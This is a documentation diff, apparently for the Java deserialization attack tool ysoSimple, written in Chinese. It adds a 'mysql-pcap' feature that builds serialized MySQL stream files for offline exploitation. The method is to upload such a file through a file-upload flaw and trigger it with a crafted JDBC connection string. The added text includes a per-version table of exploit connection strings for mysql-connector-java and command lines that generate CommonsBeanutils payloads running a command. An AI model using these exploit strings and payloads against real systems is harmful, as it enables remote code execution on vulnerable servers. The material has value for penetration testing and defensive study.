@@ -17,6 +17,7 @@ YsoAttack模块设定的额外参数：
 * encode：参数值为Base64/Hex，用于编码输出
 * writeToFile：将最终生成的内容写入到文件
 * compress：对TemplatesImpl利用链压缩
+* mysql-pcap：生成Mysql的Java序列化数据流文件
 
 #### dirt-data-length 添加垃圾数据
 
@@ -83,6 +84,36 @@ TemplatesImpl链缩小手段：
 ```
 
 YsoSimple工具中`TemplatesImpl:`​命令生成的字节码类需要继承AbstractTranslet类。`Templateslmpl0:`​命令生成的字节码类不需要继承AbstractTranslet类，但是该场景下不支持compress压缩。
+
+####  mysql-pcap 生成Mysql的Java序列化数据流文件
+
+描述：Mysql的Jdbc连接时的不出网的利用，将生成的流量文件利用文件上传漏洞传入到目标服务器，然后利用jdbc连接的方式触发漏洞。可以执行漏洞利用的客户端的版本：
+
+| mysql-connector-java版本            | JDBC连接串                                                   | 流量包版本 |
+| ----------------------------------- | ------------------------------------------------------------ | ---------- |
+| 5.1.11-5.1.18(包含俩边界)           | jdbc:mysql://ceshihost/test?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&socketFactory=com.mysql.jdbc.NamedPipeSocketFactory&namedPipePath={filePath} | Version1   |
+| 5.1.19-5.1.28(包含俩边界)           | jdbc:mysql://ceshihost/test?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&socketFactory=com.mysql.cj.core.io.NamedPipeSocketFactory&namedPipePath={filePath} | Version2   |
+| 5.1.29-5.1.48(包含俩边界)           | jdbc:mysql://ceshihost/test?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&socketFactory=com.mysql.cj.core.io.NamedPipeSocketFactory&namedPipePath={filePath} | Version2   |
+| 6.0.2-6.0.6(包含俩边界)             | jdbc:mysql://ceshihost/test?useSSL=false&autoDeserialize=true&statementInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&socketFactory=com.mysql.cj.core.io.NamedPipeSocketFactory&namedPipePath={filePath} | Version2   |
+| 8.0.11-8.0.19(11可以,19可以,20不行) | jdbc:mysql://ceshihost/test?&maxAllowedPacket=74996390&autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=root&socketFactory=com.mysql.cj.protocol.NamedPipeSocketFactory&namedPipePath={filePath} | Version3   |
+
+注意事项：因为流量包的制作不单与mysql-connector-java版本有关也和jdbc连接串中的用户名有关，ysoSimple工具的mysql-pcap会根据提供的mysql-connector-java版本同时生成jdbc连接串和流量包，漏洞利用过程中不要轻易更改jdbc连接串。
+
+工具：使用方式如下，在mysql-pcap参数后面跟mysql-connector-java依赖的版本：
+
+```bash
+-m YsoAttack -g CommonsBeanutils2_110 -a "Templateslmpl:auto_cmd:calc" -mysql-pcap 5.1.13 -writeToFile="./5.1.13.bin"
+
+-m YsoAttack -g CommonsBeanutils2_110 -a "Templateslmpl:auto_cmd:calc" -mysql-pcap 5.1.20 -writeToFile="./5.1.20.bin"
+
+-m YsoAttack -g CommonsBeanutils2_110 -a "Templateslmpl:auto_cmd:calc" -mysql-pcap 5.1.36 -writeToFile="./5.1.36.bin"
+
+-m YsoAttack -g CommonsBeanutils2_110 -a "Templateslmpl:auto_cmd:calc" -mysql-pcap 6.0.5 -writeToFile="./6.0.5.bin"
+
+-m YsoAttack -g CommonsBeanutils2_110 -a "Templateslmpl:auto_cmd:calc" -mysql-pcap 8.0.11 -writeToFile="./8.0.11.bin"
+```
+
+![image-20250810142820953](images/image-20250810142820954.png)![image-20250810142820954](images/image-20250810142746742.png)
 
 #### writeToFile 生成内容写入文件
 
